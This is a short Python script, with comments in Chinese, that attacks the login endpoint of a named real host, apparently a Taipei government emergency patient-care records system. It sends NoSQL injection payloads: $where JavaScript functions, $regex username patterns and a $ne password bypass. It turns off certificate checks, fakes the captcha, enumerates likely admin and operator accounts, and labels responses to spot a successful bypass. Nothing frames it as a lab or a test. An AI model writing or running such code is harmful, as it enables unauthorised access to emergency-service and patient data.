import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== $where 函数 (直接控制匹配) ===")
fns=[
  "function(){return true}",
  "function(){return this.source=='PORTAL'}",
  "function(){return this.source!='x'}",
  "function(){return this.username}",
  "function(){return 1}",
  "function(){return this.source}",
]
for f in fns:
    code,t=login({"username":{"$where":f},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"})
    path="SOURCE-403" if code==403 else ("CRASH-500" if code==500 else f"{code}")
    print(f"  $where {f[:35]:35s} -> {code} {path}")
    time.sleep(0.1)

print("\n=== $regex 用户名 + 爆破 (找 source 合法用户) ===")
# 用 $regex 枚举不同首字母/模式, 看是否某模式命中 source 合法
patterns=["^[a]","^[A]","^1","^t","^d","^o","^p","^s","^e","^r","^ad","^tp","^op","^di",
  "admin.*",".*admin",".*tpf",".*operator",".*dispatch",".*port",".*system",".*119",".*911",
  "^.*$","[a-z]+","[0-9]+"]
for p in patterns:
    code,t=login({"username":{"$regex":p},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"})
    path="SOURCE-403" if code==403 else ("CRASH-500" if code==500 else f"{code}")
    marker=" <== 非500!" if code not in (500,None) else ""
    print(f"  $regex {p:18s} -> {code} {path}{marker}")
    time.sleep(0.08)
print("DONE")
